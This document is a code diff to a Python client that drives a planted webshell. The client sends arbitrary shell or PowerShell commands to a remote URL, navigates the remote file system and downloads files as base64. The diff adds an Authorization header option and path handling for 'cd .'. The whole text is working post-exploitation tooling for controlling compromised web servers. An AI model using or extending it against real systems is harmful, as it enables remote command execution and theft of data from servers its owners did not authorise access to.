@@ -6,8 +6,9 @@ import argparse
 import base64
 from termcolor import colored
 
-def send_command(command, webshell, method, cookies, param="code"):
-   headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0", "Cookie":args.cookies}
+def send_command(command, webshell, method, param="code"):
+   headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
+   "Authorization":args.auth, "Cookie":args.cookies}
    params = {param.strip():command.strip()}
    if (method.upper() == "GET"):
       response = requests.get((webshell), params=params, headers=headers)
@@ -35,7 +36,8 @@ print (colored(banner, "green"))
 parser = argparse.ArgumentParser()
 parser.add_argument("url", help="Webshell URL", type=str)
 parser.add_argument("method", help="HTTP Method to execute command (GET or POST)", type=str)
-parser.add_argument("-c", "--cookies", help="Cookie header to use on web server", type=str)
+parser.add_argument("-a", "--auth", help="Authorization header to use on each request", type=str)
+parser.add_argument("-c", "--cookies", help="Cookie header to use on each request", type=str)
 parser.add_argument("-p", "--param", default="code", help="Parameter to use with custom WebShell", type=str)
 parser.add_argument("-ps", "--PowerShell", action="store_true", help="PowerShell command execution (Only on Windows hosts)")
 args = parser.parse_args()
@@ -115,12 +117,13 @@ try:
                        base64data = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
                        download = base64.b64decode(base64data).decode("utf-16le", errors="ignore").encode("utf8")
                    f = open(localfile, "wb") ; f.write(download) ; f.close()
-
                 else:
                    if "pwd" in command.split()[0]:
                       print (colored(path, "yellow"))
                    else:
                       if "cd" in command.split()[0]:
+                         if command.split()[1] == ".":
+                            continue
                          if ".." in command.split()[1]:
                             path = path.split(slash)[:-1]
                             path = (slash.join(path))
@@ -144,10 +147,8 @@ try:
                                relative_path = command_array[0]
                            if not relative_path.startswith(slash):
                              command = cmd + " " + param + path.rstrip() + slash + relative_path
-
                            content = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
                            print (colored(content, "yellow"))
-
                          else:
                            if args.PowerShell:
                               content = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
